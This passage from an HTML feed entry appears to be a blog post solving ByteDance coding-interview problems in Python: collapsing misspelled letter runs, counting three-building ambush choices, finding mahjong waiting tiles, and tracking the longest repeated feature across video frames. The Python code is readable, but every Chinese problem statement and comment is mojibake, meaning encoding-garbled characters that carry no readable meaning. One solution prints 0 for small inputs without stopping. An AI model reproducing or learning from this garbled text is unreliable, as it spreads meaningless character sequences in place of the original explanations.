        <content type="html"><![CDATA[<h2 id="ä¸‡ä¸‡æ²¡æƒ³åˆ°ä¹‹èªæ˜çš„ç¼–è¾‘">ä¸‡ä¸‡æ²¡æƒ³åˆ°ä¹‹èªæ˜çš„ç¼–è¾‘</h2><p>éœ€æ±‚: 1. ä¸‰ä¸ªåŒæ ·çš„å­—æ¯è¿åœ¨ä¸€èµ·ï¼Œä¸€å®šæ˜¯æ‹¼å†™é”™è¯¯ï¼Œå»æ‰ä¸€ä¸ªçš„å°±å¥½å•¦ï¼šæ¯”å¦‚ helllo -&gt; hello 2. ä¸¤å¯¹ä¸€æ ·çš„å­—æ¯ï¼ˆAABBå‹ï¼‰è¿åœ¨ä¸€èµ·ï¼Œä¸€å®šæ˜¯æ‹¼å†™é”™è¯¯ï¼Œå»æ‰ç¬¬äºŒå¯¹çš„ä¸€ä¸ªå­—æ¯å°±å¥½å•¦ï¼šæ¯”å¦‚ helloo -&gt; hello 3. ä¸Šé¢çš„è§„åˆ™ä¼˜å…ˆâ€œä»å·¦åˆ°å³â€åŒ¹é…ï¼Œå³å¦‚æœæ˜¯AABBCCï¼Œè™½ç„¶AABBå’ŒBBCCéƒ½æ˜¯é”™è¯¯æ‹¼å†™ï¼Œåº”è¯¥ä¼˜å…ˆè€ƒè™‘ä¿®å¤AABBï¼Œç»“æœä¸ºAABCC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">2</span><br><span class="line">helloo</span><br><span class="line">wooooooow</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">hello</span><br><span class="line">woow</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯»å…¥,ç”¨æ ˆå¯¹æœ€æ–°è¯»å…¥åšcheckå°±è¡Œäº† <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">inputs = sys.stdin.readlines()[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fix</span>(<span class="params">string</span>):</span><br><span class="line">    fixed_string = []</span><br><span class="line">    fixed_string.append(string[<span class="number">0</span>])</span><br><span class="line">    fixed_string.append(string[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> char == fixed_string[-<span class="number">1</span>] == fixed_string[-<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fixed_string.append(char)</span><br><span class="line">            <span class="keyword">if</span> fixed_string[-<span class="number">1</span>] == fixed_string[-<span class="number">2</span>]:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(fixed_string) &gt; <span class="number">3</span> <span class="keyword">and</span> fixed_string[-<span class="number">3</span>] == fixed_string[-<span class="number">4</span>]:</span><br><span class="line">                    fixed_string.pop()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(fixed_string)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> sentence <span class="keyword">in</span> inputs:</span><br><span class="line">    <span class="built_in">print</span>(fix(sentence.strip()))</span><br></pre></td></tr></table></figure></p><h2 id="ä¸‡ä¸‡æ²¡æƒ³åˆ°ä¹‹æŠ“æ•å­”è¿é¡º">ä¸‡ä¸‡æ²¡æƒ³åˆ°ä¹‹æŠ“æ•å­”è¿é¡º</h2><ol type="1"><li>æˆ‘ä»¬åœ¨å­—èŠ‚è·³åŠ¨å¤§è¡—çš„ N ä¸ªå»ºç­‘ä¸­é€‰å®š 3 ä¸ªåŸ‹ä¼åœ°ç‚¹ã€‚</li><li>ä¸ºäº†ç›¸äº’ç…§åº”ï¼Œæˆ‘ä»¬å†³å®šç›¸è·æœ€è¿œçš„ä¸¤åç‰¹å·¥é—´çš„è·ç¦»ä¸è¶…è¿‡ D</li></ol><p>ç»™å®š Nï¼ˆå¯é€‰ä½œä¸ºåŸ‹ä¼ç‚¹çš„å»ºç­‘ç‰©æ•°ï¼‰ã€ Dï¼ˆç›¸è·æœ€è¿œçš„ä¸¤åç‰¹å·¥é—´çš„è·ç¦»çš„æœ€å¤§å€¼ï¼‰ä»¥åŠå¯é€‰å»ºç­‘çš„åæ ‡ï¼Œè®¡ç®—åœ¨è¿™æ¬¡è¡ŒåŠ¨ä¸­ï¼Œå¤§é”¤çš„å°é˜Ÿæœ‰å¤šå°‘ç§åŸ‹ä¼é€‰æ‹©ã€‚ æ³¨æ„ï¼š 1. ä¸¤ä¸ªç‰¹å·¥ä¸èƒ½åŸ‹ä¼åœ¨åŒä¸€åœ°ç‚¹ 2. ä¸‰ä¸ªç‰¹å·¥æ˜¯ç­‰ä»·çš„ï¼šå³åŒæ ·çš„ä½ç½®ç»„åˆ( A , B , C ) åªç®—ä¸€ç§åŸ‹ä¼æ–¹æ³•ï¼Œä¸èƒ½å› â€œç‰¹å·¥ä¹‹é—´äº’æ¢ä½ç½®â€è€Œé‡å¤ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">4 3</span><br><span class="line">1 2 3 4</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">4</span><br><span class="line">ä¾‹å­è¯´æ˜ï¼š</span><br><span class="line">å¯é€‰æ–¹æ¡ˆ (1, 2, 3), (1, 2, 4), (1, 3, 4), (2, 3, 4)   </span><br></pre></td></tr></table></figure><p>æœ¬è´¨æ˜¯ä¸ªæŸ¥æ‰¾,ä»å‰å¾€åéå†,å›ºå®šè¢«é€‰æ‹©çš„å»ºç­‘i,æ‰¾å‡ºè·ç¦»å»ºç­‘iè·ç¦»ä¸è¶…è¿‡Dçš„å°½å¯èƒ½è¿œçš„å»ºç­‘,åšCn2å³å¯. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">inputs = sys.stdin.readlines()</span><br><span class="line">N, D = <span class="built_in">map</span>(<span class="built_in">int</span>, inputs[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> N &lt;= <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">location = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> inputs[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binsearch</span>(<span class="params">target, l, r, arr</span>):</span><br><span class="line">    mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        <span class="keyword">if</span> arr[mid] == target:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> arr[mid] &lt; target:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cn2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> n * (n - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">2</span>):</span><br><span class="line">    r = binsearch(location[i] + D, i, N-<span class="number">1</span>, location)</span><br><span class="line">    <span class="keyword">if</span> r - i &gt;= <span class="number">2</span>:</span><br><span class="line">        res += Cn2(r-i)</span><br><span class="line"><span class="comment"># æŒ‰ç‰›å®¢éœ€æ±‚: ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºä¸åŒåŸ‹ä¼æ–¹æ¡ˆçš„æ•°é‡ã€‚ç»“æœå¯èƒ½æº¢å‡ºï¼Œè¯·å¯¹ 99997867 å–æ¨¡</span></span><br><span class="line"><span class="built_in">print</span>(res % <span class="number">99997867</span>)</span><br></pre></td></tr></table></figure></p><h2 id="é›€é­‚å¯åŠ¨">é›€é­‚å¯åŠ¨ï¼</h2><p>å°åŒ…æœ€è¿‘è¿·ä¸Šäº†ä¸€æ¬¾å«åšé›€é­‚çš„éº»å°†æ¸¸æˆï¼Œä½†æ˜¯è¿™ä¸ªæ¸¸æˆè§„åˆ™å¤ªå¤æ‚ï¼Œå°åŒ…ç©äº†å‡ ä¸ªæœˆäº†è¿˜æ˜¯è¾“å¤šèµ¢å°‘ã€‚ äºæ˜¯ç”Ÿæ°”çš„å°åŒ…æ ¹æ®æ¸¸æˆç®€åŒ–äº†ä¸€ä¸‹è§„åˆ™å‘æ˜äº†ä¸€ç§æ–°çš„éº»å°†ï¼Œåªç•™ä¸‹ä¸€ç§èŠ±è‰²ï¼Œå¹¶ä¸”å»é™¤äº†ä¸€äº›ç‰¹æ®Šå’Œç‰Œæ–¹å¼ï¼ˆä¾‹å¦‚ä¸ƒå¯¹å­ç­‰ï¼‰ï¼Œå…·ä½“çš„è§„åˆ™å¦‚ä¸‹ï¼š</p><ol type="1"><li>æ€»å…±æœ‰36å¼ ç‰Œï¼Œæ¯å¼ ç‰Œæ˜¯1~9ã€‚æ¯ä¸ªæ•°å­—4å¼ ç‰Œã€‚</li><li>ä½ æ‰‹é‡Œæœ‰å…¶ä¸­çš„14å¼ ç‰Œï¼Œå¦‚æœè¿™14å¼ ç‰Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³ç®—ä½œå’Œç‰Œ</li></ol><ul><li>14å¼ ç‰Œä¸­æœ‰2å¼ ç›¸åŒæ•°å­—çš„ç‰Œï¼Œç§°ä¸ºé›€å¤´ã€‚</li><li>é™¤å»ä¸Šè¿°2å¼ ç‰Œï¼Œå‰©ä¸‹12å¼ ç‰Œå¯ä»¥ç»„æˆ4ä¸ªé¡ºå­æˆ–åˆ»å­ã€‚é¡ºå­çš„æ„æ€æ˜¯é€’å¢çš„è¿ç»­3ä¸ªæ•°å­—ç‰Œï¼ˆä¾‹å¦‚234,567ç­‰ï¼‰ï¼Œåˆ»å­çš„æ„æ€æ˜¯ç›¸åŒæ•°å­—çš„3ä¸ªæ•°å­—ç‰Œï¼ˆä¾‹å¦‚111,777ï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">1 1 1 1 2 2 3 3 5 6 7 8 9</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">4 7</span><br><span class="line">ä¾‹å­è¯´æ˜ï¼š</span><br><span class="line">ç”¨1åšé›€å¤´ï¼Œç»„123,123,567æˆ–456,789çš„å››ä¸ªé¡ºå­</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŒ‰å–é¢å­+é›€å¤´çœ‹å‰©ä¸‹ä»€ä¹ˆç‰Œæ¥åšå¬ç‰Œcheck,å¯ä»¥åˆ†3é¢å­+1é›€å¤´+1æ­å­æˆ–è€…4é¢å­+å•å¼ ,ä½†éœ€è¦åšé¢å¤–åˆ¤æ–­(æ­å­æ˜¯å¦å¬ç‰Œä»¥åŠå¬ä»€ä¹ˆç‰Œ). æ‰€ä»¥è¿™é‡Œé€‰æ‹©å¦ä¸€ç§æ–¹å¼,ç›´æ¥1-9éå†,å¿…å®šå‡‘å‡º4é¢å­+1é›€å¤´æ‰æ˜¯å¬ç‰Œ. å¬ç‰Œåˆ¤æ–­å°±æ˜¯è¿­ä»£åŠ å›æº¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">inputs = <span class="built_in">map</span>(<span class="built_in">int</span>, sys.stdin.readlines()[<span class="number">0</span>].split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">hand = Counter(inputs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_tinpai</span>(<span class="params">hand, quetou=<span class="number">0</span>, tile=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> tile:</span><br><span class="line">        hand[tile] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(hand.values()) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(hand.keys()):</span><br><span class="line">        <span class="keyword">if</span> hand[key] &gt; <span class="number">0</span>:</span><br><span class="line">            leftmost = key</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check åˆ»å­</span></span><br><span class="line">    <span class="keyword">if</span> hand[leftmost] &gt;= <span class="number">3</span>:</span><br><span class="line">        hand[leftmost] -= <span class="number">3</span></span><br><span class="line">        tinpai_1 = check_tinpai(hand, quetou=quetou)</span><br><span class="line">        <span class="comment"># å›æº¯</span></span><br><span class="line">        hand[leftmost] += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tinpai_1 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hand[leftmost] &gt; <span class="number">0</span> <span class="keyword">and</span> hand[leftmost + <span class="number">1</span>] &gt; <span class="number">0</span> <span class="keyword">and</span> hand[leftmost + <span class="number">2</span>] &gt; <span class="number">0</span>:</span><br><span class="line">        hand[leftmost] -= <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">1</span>] -= <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">2</span>] -= <span class="number">1</span></span><br><span class="line">        tinpai_2 = check_tinpai(hand, quetou=quetou)</span><br><span class="line">        hand[leftmost] += <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">2</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tinpai_2 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> quetou == <span class="number">0</span> <span class="keyword">and</span> hand[leftmost] &gt;= <span class="number">2</span>:</span><br><span class="line">        hand[leftmost] -= <span class="number">2</span></span><br><span class="line">        tinpai_3 = check_tinpai(hand, quetou=quetou + <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># å›æº¯</span></span><br><span class="line">        hand[leftmost] += <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tinpai_3 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tile:</span><br><span class="line">        hand[tile] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tinpai_1 <span class="keyword">or</span> tinpai_2 <span class="keyword">or</span> tinpai_3:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> hand[i] &lt; <span class="number">4</span>:</span><br><span class="line">        tinpai = check_tinpai(hand, <span class="number">0</span>, i)</span><br><span class="line">        <span class="keyword">if</span> tinpai:</span><br><span class="line">            result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="ç‰¹å¾æå–">ç‰¹å¾æå–</h2><p>å°æ˜æ˜¯ä¸€åç®—æ³•å·¥ç¨‹å¸ˆï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€åé“²å±å®˜ã€‚æŸå¤©ï¼Œä»–çªå‘å¥‡æƒ³ï¼Œæƒ³ä»çŒ«å’ªçš„è§†é¢‘é‡ŒæŒ–æ˜ä¸€äº›çŒ«å’ªçš„è¿åŠ¨ä¿¡æ¯ã€‚ä¸ºäº†æå–è¿åŠ¨ä¿¡æ¯ï¼Œä»–éœ€è¦ä»è§†é¢‘çš„æ¯ä¸€å¸§æå–â€œçŒ«å’ªç‰¹å¾â€ã€‚ä¸€ä¸ªçŒ«å’ªç‰¹å¾æ˜¯ä¸€ä¸ªä¸¤ç»´çš„vector&lt;x, y&gt;ã€‚å¦‚æœx_1=x_2 and y_1=y_2ï¼Œé‚£ä¹ˆè¿™ä¿©æ˜¯åŒä¸€ä¸ªç‰¹å¾ã€‚å› æ­¤ï¼Œå¦‚æœå–µå’ªç‰¹å¾è¿ç»­ä¸€è‡´ï¼Œå¯ä»¥è®¤ä¸ºå–µå’ªåœ¨è¿åŠ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœç‰¹å¾&lt;a, b&gt;åœ¨æŒç»­å¸§é‡Œå‡ºç°ï¼Œé‚£ä¹ˆå®ƒå°†æ„æˆç‰¹å¾è¿åŠ¨ã€‚æ¯”å¦‚ï¼Œç‰¹å¾&lt;a, b&gt;åœ¨ç¬¬2/3/4/7/8å¸§å‡ºç°ï¼Œé‚£ä¹ˆè¯¥ç‰¹å¾å°†å½¢æˆä¸¤ä¸ªç‰¹å¾è¿åŠ¨2-3-4 å’Œ7-8ã€‚ç°åœ¨ï¼Œç»™å®šæ¯ä¸€å¸§çš„ç‰¹å¾ï¼Œç‰¹å¾çš„æ•°é‡å¯èƒ½ä¸ä¸€æ ·ã€‚å°æ˜æœŸæœ›èƒ½æ‰¾åˆ°æœ€é•¿çš„ç‰¹å¾è¿åŠ¨ã€‚</p><p><strong>è¾“å…¥æè¿°</strong> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ­£æ•´æ•°Nï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹çš„ä¸ªæ•°ã€‚</span><br><span class="line"></span><br><span class="line">æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ­£æ•´æ•°Mï¼Œä»£è¡¨è§†é¢‘çš„å¸§æ•°ã€‚</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥çš„Mè¡Œï¼Œæ¯è¡Œä»£è¡¨ä¸€å¸§ã€‚å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªæ•°å­—æ˜¯è¯¥å¸§çš„ç‰¹å¾ä¸ªæ•°ï¼Œæ¥ä¸‹æ¥çš„æ•°å­—æ˜¯åœ¨ç‰¹å¾çš„å–å€¼ï¼›æ¯”å¦‚æ ·ä¾‹è¾“å…¥ç¬¬ä¸‰è¡Œé‡Œï¼Œ2ä»£è¡¨è¯¥å¸§æœ‰ä¸¤ä¸ªçŒ«å’ªç‰¹å¾ï¼Œ&lt;1ï¼Œ1&gt;å’Œ&lt;2ï¼Œ2&gt;</span><br><span class="line">æ‰€æœ‰ç”¨ä¾‹çš„è¾“å…¥ç‰¹å¾æ€»æ•°å’Œ&lt;100000</span><br><span class="line"></span><br><span class="line">Næ»¡è¶³1â‰¤Nâ‰¤100000ï¼ŒMæ»¡è¶³1â‰¤Mâ‰¤10000ï¼Œä¸€å¸§çš„ç‰¹å¾ä¸ªæ•°æ»¡è¶³ â‰¤ 10000ã€‚</span><br><span class="line">ç‰¹å¾å–å€¼å‡ä¸ºéè´Ÿæ•´æ•°ã€‚</span><br></pre></td></tr></table></figure></p><p><strong>ç¤ºä¾‹</strong> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">1</span><br><span class="line">8</span><br><span class="line">2 1 1 2 2</span><br><span class="line">2 1 1 1 4</span><br><span class="line">2 1 1 2 2</span><br><span class="line">2 2 2 1 4</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">1 1 1</span><br><span class="line">1 1 1</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">3</span><br><span class="line">ä¾‹å­è¯´æ˜ï¼š</span><br><span class="line">ç‰¹å¾&lt;1,1&gt;åœ¨è¿ç»­çš„å¸§ä¸­è¿ç»­å‡ºç°3æ¬¡ï¼Œç›¸æ¯”å…¶ä»–ç‰¹å¾è¿ç»­å‡ºç°çš„æ¬¡æ•°å¤§ï¼Œæ‰€ä»¥è¾“å‡º3</span><br></pre></td></tr></table></figure></p><p>ç”¨defaultdict,æ£€æµ‹è¿ç»­ç‰¹å¾è®¡æ•°+1,å¦åˆ™popç‰¹å¾å¹¶åšmaxåˆ¤æ–­ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">instance_count = <span class="built_in">int</span>(sys.stdin.readline())</span><br><span class="line">result_lst = []</span><br><span class="line"><span class="keyword">for</span> instance <span class="keyword">in</span> <span class="built_in">range</span>(instance_count):</span><br><span class="line">    max_length = <span class="number">0</span></span><br><span class="line">    animation_dict = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">    frame_count = <span class="built_in">int</span>(sys.stdin.readline())</span><br><span class="line">    <span class="keyword">for</span> frame_index <span class="keyword">in</span> <span class="built_in">range</span>(frame_count):</span><br><span class="line">        frame_input = sys.stdin.readline().strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        feature_pool = []</span><br><span class="line">        feature_num = <span class="built_in">int</span>(frame_input[<span class="number">0</span>])</span><br><span class="line">        features = frame_input[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> feature_index <span class="keyword">in</span> <span class="built_in">range</span>(feature_num):</span><br><span class="line">            feature = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            feature_length = <span class="built_in">len</span>(features)//feature_num</span><br><span class="line">            <span class="keyword">for</span> feature_pos <span class="keyword">in</span> <span class="built_in">range</span>(feature_length):</span><br><span class="line">                feature += features[feature_index*feature_length + feature_pos]</span><br><span class="line">                feature += <span class="string">&#x27; &#x27;</span></span><br><span class="line">            feature_pool.append(feature)</span><br><span class="line"></span><br><span class="line">        keys = <span class="built_in">list</span>(animation_dict.keys())</span><br><span class="line">        <span class="keyword">for</span> feature <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">if</span> feature <span class="keyword">in</span> feature_pool:</span><br><span class="line">                animation_dict[feature] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                value = animation_dict.pop(feature)</span><br><span class="line">                <span class="keyword">if</span> value &gt; max_length:</span><br><span class="line">                    max_length = value</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> feature <span class="keyword">in</span> feature_pool:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> animation_dict[feature]:</span><br><span class="line">                animation_dict[feature] += <span class="number">1</span></span><br><span class="line">    max_length_in_dict = <span class="built_in">sorted</span>(animation_dict.values())[-<span class="number">1</span>]</span><br><span class="line">    max_length = max_length_in_dict <span class="keyword">if</span> max_length_in_dict &gt; max_length <span class="keyword">else</span> max_length</span><br><span class="line">    result_lst.append(max_length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> result_lst:</span><br><span class="line">    <span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure></p><h2 